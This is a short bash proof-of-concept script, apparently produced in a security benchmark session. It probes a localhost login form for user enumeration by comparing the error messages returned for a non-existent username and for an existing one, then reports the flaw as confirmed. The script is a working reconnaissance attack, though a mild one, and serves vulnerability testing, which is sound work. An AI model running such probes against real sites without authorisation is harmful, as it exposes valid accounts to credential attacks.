#!/bin/bash
# POC: Demonstrates user enumeration vulnerability through differential error messages in login form. Tests non-existent user vs existing user to show different responses.
# Target: ./repo
# Created: 2025-11-07T16:35:35.669Z
# Session: benchmark-XBEN-001-24-mhp2ljz1

# User Enumeration via Error Message Analysis POC
# This script demonstrates how an attacker can enumerate valid usernames
# by analyzing differential error messages from the login endpoint

TARGET_URL="http://localhost:8082"
LOGIN_ENDPOINT="/"

echo "[*] User Enumeration via Error Message Analysis POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Non-existent username
echo "[*] Test 1: Submitting non-existent username..."
NONEXISTENT_RESPONSE=$(curl -s -X POST "$TARGET_URL$LOGIN_ENDPOINT" -d "username=nonexistent")
echo "[+] Response for non-existent user:"
echo "$NONEXISTENT_RESPONSE"
echo ""

# Test 2: Existing username
echo "[*] Test 2: Submitting existing username 'test'..."
EXISTING_RESPONSE=$(curl -s -X POST "$TARGET_URL$LOGIN_ENDPOINT" -d "username=test")
echo "[+] Response for existing user:"
echo "$EXISTING_RESPONSE"
echo ""

# Analysis
echo "[*] Analysis:"
if echo "$NONEXISTENT_RESPONSE" | grep -q "User not found"; then
    echo "[!] VULNERABILITY CONFIRMED: Non-existent user returns 'User not found' error"
else
    echo "[-] Could not detect 'User not found' message"
fi

if echo "$EXISTING_RESPONSE" | grep -q "Welcome"; then
    echo "[!] VULNERABILITY CONFIRMED: Existing user returns personalized welcome message"
else
    echo "[-] Could not detect personalized welcome message"
fi

# Check if responses are different
if [ "$NONEXISTENT_RESPONSE" != "$EXISTING_RESPONSE" ]; then
    echo "[!] VULNERABILITY CONFIRMED: Different responses for different usernames confirm user enumeration is possible"
else
    echo "[-] Responses are identical (vulnerability mitigated)"
fi

echo ""
echo "[*] Impact: Attackers can enumerate valid usernames by analyzing error messages"